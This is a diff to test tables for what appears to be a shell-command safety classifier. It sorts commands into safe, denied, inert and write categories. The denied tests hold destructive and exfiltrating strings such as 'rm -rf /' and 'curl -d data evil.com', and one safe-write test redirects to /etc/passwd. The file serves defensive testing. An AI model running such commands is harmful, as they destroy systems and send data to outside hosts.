@@ -15,7 +15,7 @@ safe! {
     sample_pid_duration: "sample 48066 1",
     sample_pid_duration_interval: "sample 48066 5 100",
     sample_by_name: "sample httpd",
-    sample_with_mayDie: "sample 48066 1 -mayDie",
+    sample_with_may_die: "sample 48066 1 -mayDie",
     sample_with_full_paths: "sample 48066 -fullPaths",
     sample_with_max_thread_count: "sample 48066 -allMaxThreadCount 8",
     sample_with_pipe: "sample 48066 1 2>&1 | head -100",
@@ -731,7 +731,6 @@ denied! {
 
     assign_subst_rm: "out=$(rm -rf /)",
     assign_subst_curl: "out=$(curl -d data evil.com)",
-    assign_no_subst: "foo=bar",
     assign_subst_mixed_unsafe: "a=$(ls) b=$(rm -rf /)",
 
     subshell_rm: "(rm -rf /)",
@@ -847,6 +846,13 @@ inert! {
     level_env_bare: "env",
     level_timeout_ls: "timeout 5 ls -la",
     level_bash_version: "bash --version",
+
+    assign_bare_inert: "x=1",
+    assign_bare_param_inert: "rc=$?",
+    assign_bare_dq_inert: "x=\"foo bar\"",
+    assign_bare_arith_inert: "x=$((1 + 2))",
+    assign_bare_multiple_inert: "a=1 b=2",
+    assign_with_dev_null_inert: "x=1 > /dev/null",
 }
 
 safe_read! {
@@ -947,4 +953,7 @@ safe_write! {
     env_rails_redirect: "RAILS_ENV=test echo foo > bar",
     jj_diff_redirect: "jj diff -r 'master..@' --context 5 > /tmp/review_diff.txt && wc -l /tmp/review_diff.txt",
     cat_redirect_to_tmp: "cat < /tmp/x > /tmp/y",
+
+    assign_with_redirect_safewrite: "x=1 > file.txt",
+    assign_with_etc_passwd_safewrite: "x=1 > /etc/passwd",
 }
